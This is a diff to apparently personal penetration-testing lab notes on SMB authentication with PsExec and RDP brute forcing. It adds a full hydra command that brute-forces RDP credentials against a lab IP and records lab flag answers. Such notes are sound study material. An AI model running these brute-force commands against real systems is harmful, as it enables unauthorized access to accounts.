@@ -185,13 +185,34 @@ SMB AUTHENTICATION
 * User Authentication -> Username and password
 * Share Authentication -> Password
 
-PsExec is a lightweight telnet replacement developed by microsoft.
+```PsExec``` is a lightweight telnet replacement developed by microsoft.
 It can be used for authentication by SMB.
 
 Typical attack would be brute forcing username and password and then using psexec for the authentication.
 
 eg lab:
 flag: e0da81a9cd42b261bc9b90d15f780433
+
+
+## Exploiting RDP
+
+Default Port : 3389
+default Attack type : Brute force
+
+bruteforcing using hydra if rdp is configured on port 3333:: ```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.5.21.28 -s 3333```
+
+eg lab:
+flag: port-number-3333
+
+
+## exploiting winrm
+
+
+
+
+
+
+
 
 
 
